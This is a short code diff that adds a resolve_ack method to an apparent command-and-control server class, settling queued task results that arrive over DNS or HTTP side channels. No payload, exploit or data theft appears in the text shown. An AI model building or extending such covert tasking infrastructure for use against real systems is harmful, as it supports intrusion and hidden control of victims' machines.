@@ -246,6 +246,22 @@ class C2Server:
         else:
             log.debug("[c2] no handler for command: %r", cmd)
 
+    # ── external ACK resolution (DNS / HTTP transports) ──────────────────
+    def resolve_ack(self, task_id: str, data: dict) -> bool:
+        """
+        Resolve a pending task future from an out-of-band transport (DNS, HTTP).
+        Returns True if the task was found and resolved, False if unknown/done.
+        """
+        task = self._pending.get(task_id)
+        if task and not task.future.done():
+            task.future.set_result({
+                "status":  data.get("status", "ok"),
+                "output":  data.get("output", ""),
+                "task_id": task_id,
+            })
+            return True
+        return False
+
     # ── status / introspection ────────────────────────────────────────────
     def pending_tasks(self) -> list[dict]:
         return [
